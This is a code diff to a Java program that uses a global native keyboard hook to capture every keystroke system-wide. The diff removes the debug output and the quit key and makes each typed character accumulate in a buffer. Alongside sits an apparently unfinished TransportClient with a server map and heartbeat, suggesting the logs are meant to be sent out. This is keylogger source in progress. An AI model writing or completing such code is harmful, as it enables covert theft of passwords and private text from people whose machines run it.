@@ -8,24 +8,19 @@ import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
-public class main {
+public class Test {
 
 	public static void main(String[] args) throws NativeHookException {
 
 		GlobalScreen.registerNativeHook();
 
+		final FileManager fileManager = new FileManager();
+
 		GlobalScreen.getInstance().addNativeKeyListener(new NativeKeyListener() {
 
 			@Override
-			public void nativeKeyTyped(NativeKeyEvent e) {
-				System.out.println("Native key typed " + e.getKeyChar());
-
-				Character c = calculateFinalChar(e);
-				addChar(c);
-
-				if (e.getKeyChar() == 'q') {
-					GlobalScreen.unregisterNativeHook();
-				}
+			public void nativeKeyTyped(NativeKeyEvent event) {
+				fileManager.addChar(fileManager.calculateFinalChar(event));
 			}
 
 			@Override
@@ -42,12 +37,14 @@ public class main {
 
 		private File file;
 
+		private final StringBuilder content = new StringBuilder();
+
 		public Character calculateFinalChar(NativeKeyEvent event) {
-			return null;
+			return event.getKeyChar();
 		}
 
 		public void addChar(Character c) {
-
+			content.append(c);
 		}
 
 		public byte[] getContent() {
@@ -61,7 +58,7 @@ public class main {
 
 	public static class TransportClient {
 
-		private final Map<String, Integer> servers;
+		private final Map<String, Integer> servers = null;
 
 		public void sendHeartBeat() {
 
